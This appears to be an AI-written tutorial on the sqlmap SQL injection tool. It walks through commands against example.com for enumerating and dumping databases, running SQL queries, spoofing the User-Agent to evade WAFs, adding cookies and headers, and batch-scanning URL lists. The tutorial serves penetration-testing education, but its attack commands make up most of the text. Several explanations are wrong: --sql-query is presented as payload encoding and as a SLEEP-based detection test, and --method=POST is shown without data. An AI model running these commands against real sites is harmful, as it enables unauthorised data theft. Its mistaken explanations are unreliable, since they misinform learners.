 `sqlmap` is a powerful and versatile tool for detecting and exploiting SQL injection vulnerabilities in web applications. It supports various features to automate the process of testing for SQL injection flaws and taking advantage of these issues. Below, I'll outline some common features of `sqlmap`, providing examples where applicable. Please note that using `sqlmap` responsibly is crucial; always have permission to test a target.

### Basic Usage
To run `sqlmap`, you would typically use the following command in your Kali Linux terminal:
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
```
This command tells `sqlmap` to perform an SQL injection scan against a target URL (`http://example.com/page.php?id=1`) and enumerate the databases available on the server.

### Features with Examples

#### 1. Enumerate Databases
To list all databases, use:
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
```
This will output a list of databases found on the server.

#### 2. Dump Database Content
After identifying the database(s) you want to dump, use:
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms="MySQL" --tables -D "database_name"
```
Replace `"database_name"` with the name of the database you're interested in, and `--tables` will list all tables within that database.

To dump specific table data:
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms="MySQL" --dump -D "database_name" --table "table_name"
```
Replace `"table_name"` with the name of the table you want to extract data from.

#### 3. Specify Payload Encoding and User-Agent
You can specify how SQLi payloads should be encoded using `--sql-query` or `--sql-shell`:
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms="MySQL" --sql-query "SELECT 1, SLEEP(5)"
```
This command will attempt to inject a query that makes the server sleep for five seconds if it's vulnerable to SQL injection.

Customize the User-Agent with:
```bash
sqlmap -u "http://example.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 6.3; WOW64)"
```
This can help in bypassing certain WAFs or detecting the application more accurately.

#### 4. Specify HTTP Method and Headers
You can specify if you want to use POST instead of GET requests:
```bash
sqlmap -u "http://example.com/page.php?id=1" --method="POST"
```
Add custom headers with `--headers`:
```bash
sqlmap -u "http://example.com/page.php?id=1" --headers="Authorization: Basic dGVzdHVzZXJuYW1lOnRlc3Q="
```
This example adds a basic authentication header to the request.

#### 5. Cookie and Session Data
Include cookies in your requests using `--cookie`:
```bash
sqlmap -u "http://example.com/page.php?id=1" --cookie="session_id=12345"
```
This command will include a cookie named `session_id` with the value `12345`.

#### 6. Detecting and Exploiting SQL Injection
To detect if there's an SQL injection vulnerability:
```bash
sqlmap -u "http://example.com/page.php?id=1" --risk 3 --level 2
```
This command increases the risk (`--risk`) and level of detection to try harder to find potential issues.

#### 7. Using SQLMap in Batch Mode
You can also run `sqlmap` on a list of targets:
```bash
cat urls.txt | while read url; do sqlmap -u "$url" --dbs; done
```
This script reads URLs from a file named `urls.txt`, and for each URL, it runs the SQL injection scan against all databases.

### Conclusion
`sqlmap` offers numerous features to automate SQL injection testing, making it an essential tool in a pentester's toolkit. Always ensure you have permission before running such tools on any system or network you do not own.

